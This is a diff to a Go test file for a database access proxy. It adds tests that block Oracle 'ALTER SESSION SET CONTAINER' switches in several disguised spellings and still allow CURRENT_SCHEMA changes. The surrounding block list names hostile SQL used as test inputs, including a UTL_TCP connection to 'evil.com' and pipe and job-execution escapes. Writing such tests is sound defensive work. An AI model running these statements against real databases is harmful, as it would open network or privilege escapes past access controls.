@@ -96,6 +96,11 @@ func TestValidateOracleQuery_BlocksDangerousPatterns(t *testing.T) {
 		{"BEGIN DBMS_PIPE.SEND_MESSAGE('pipe'); END;", "IPC escape"},
 		{"BEGIN UTL_TCP.OPEN_CONNECTION('evil.com', 80); END;", "network escape"},
 		{"BEGIN DBMS_JOB.SUBMIT(1, 'BEGIN NULL; END;'); END;", "async execution"},
+		{"ALTER SESSION SET CONTAINER = PDB2", "pluggable database switch"},
+		{"alter session set container=pdb2", "same, lower case and unspaced"},
+		{`ALTER SESSION SET "CONTAINER" = PDB2`, "same, quoted parameter name"},
+		{"ALTER SESSION SET CURRENT_SCHEMA=X CONTAINER=PDB2", "CONTAINER not the first parameter"},
+		{"ALTER\tSESSION\nSET\n  CONTAINER\n=\nPDB2", "same, folded across whitespace"},
 	}
 	for _, tt := range blocked {
 		t.Run(tt.reason, func(t *testing.T) {
@@ -347,6 +352,83 @@ func TestValidateQuery_AlterSessionCarveOut(t *testing.T) {
 	require.ErrorIs(t,
 		ValidateOracleQuery("ALTER SYSTEM SET open_cursors=1000", &store.Grant{Definition: &store.GrantDefinition{}}),
 		ErrOraclePatternBlocked)
+}
+
+// TestValidateOracleQuery_BlocksAlterSessionContainer pins that `ALTER SESSION
+// SET CONTAINER = <pdb>` is refused whatever the grant says, and that the two
+// mechanisms that can refuse it agree.
+//
+// They have to be checked together because they are ordered: oracleBlockedPatterns
+// runs *after* ValidateQuery, so a future edit that put CONTAINER on
+// alterSessionAllowedParams would hand a read_only session the statement before
+// the pattern was ever consulted, and nothing else in this file would notice.
+func TestValidateOracleQuery_BlocksAlterSessionContainer(t *testing.T) {
+	t.Parallel()
+
+	fullWrite := &store.Grant{Definition: &store.GrantDefinition{}}
+	readOnly := &store.Grant{Definition: &store.GrantDefinition{Controls: []string{store.ControlReadOnly}}}
+	blockDDL := &store.Grant{Definition: &store.GrantDefinition{Controls: []string{store.ControlBlockDDL}}}
+
+	containerSwitches := []string{
+		"ALTER SESSION SET CONTAINER = PDB2",
+		"alter session set container=pdb2",
+		`ALTER SESSION SET "CONTAINER"=PDB2`,
+		"ALTER SESSION SET CONTAINER = 'PDB2'",
+		"ALTER SESSION SET CONTAINER=CDB$ROOT",
+		// Multi-parameter: CONTAINER is not what SET is followed by here, so a
+		// `SET\s+CONTAINER` anchor would miss it while the switch still happens.
+		"ALTER SESSION SET CURRENT_SCHEMA=X CONTAINER=PDB2",
+		"ALTER SESSION SET NLS_SORT=BINARY CONTAINER=PDB2",
+		"ALTER\tSESSION\nSET\n  CONTAINER\n=\nPDB2",
+	}
+
+	for _, sql := range containerSwitches {
+		// Mechanism 1 — the allowlist never admits it, so the statement keeps the
+		// write/DDL classification its leading ALTER gives it.
+		assert.False(t, IsAllowedAlterSession(sql), "must not be allowlisted: %s", sql)
+		assert.True(t, IsWriteQuery(sql), "still a write: %s", sql)
+		assert.True(t, IsDDLQuery(sql), "still DDL: %s", sql)
+
+		// Mechanism 2 — blocked outright, which is what closes the full-write hole
+		// (a grant with neither control used to allow the switch).
+		assert.ErrorIs(t, ValidateOracleQuery(sql, fullWrite), ErrOraclePatternBlocked, "full write: %s", sql)
+
+		// The restricted grants refuse it first, on the shared path: a different
+		// error, never a pass.
+		assert.ErrorIs(t, ValidateOracleQuery(sql, readOnly), ErrReadOnlyViolation, "read_only: %s", sql)
+		assert.ErrorIs(t, ValidateOracleQuery(sql, blockDDL), ErrDDLBlocked, "block_ddl: %s", sql)
+	}
+}
+
+// TestValidateOracleQuery_AllowsAlterSessionCurrentSchema is the other half of
+// the CONTAINER decision. CURRENT_SCHEMA changes unqualified name resolution
+// only — Oracle still evaluates privileges as the connected user and a dbbat
+// grant is scoped to a database rather than a schema — so it stays allowed, and
+// the new CONTAINER pattern must not swallow it (nor a value that merely ends in
+// the word).
+func TestValidateOracleQuery_AllowsAlterSessionCurrentSchema(t *testing.T) {
+	t.Parallel()
+
+	grants := map[string]*store.Grant{
+		"full_write": {Definition: &store.GrantDefinition{}},
+		"read_only":  {Definition: &store.GrantDefinition{Controls: []string{store.ControlReadOnly}}},
+		"block_ddl":  {Definition: &store.GrantDefinition{Controls: []string{store.ControlBlockDDL}}},
+	}
+
+	allowed := []string{
+		"ALTER SESSION SET CURRENT_SCHEMA=TESTADM",
+		"ALTER SESSION SET CURRENT_SCHEMA = TESTADM",
+		`ALTER SESSION SET "CURRENT_SCHEMA" = "TestAdm"`,
+		"ALTER SESSION SET CURRENT_SCHEMA=MY_CONTAINER", // a schema that ends in the word
+		"ALTER SESSION SET NLS_DATE_FORMAT='YYYY-MM-DD'",
+		"SELECT container_id FROM v$containers", // reads about containers are reads
+	}
+
+	for _, sql := range allowed {
+		for name, grant := range grants {
+			require.NoError(t, ValidateOracleQuery(sql, grant), "%s should allow: %s", name, sql)
+		}
+	}
 }
 
 // TestAlterSessionCarveOut_LeavesOtherDialectsAlone pins that the carve-out is
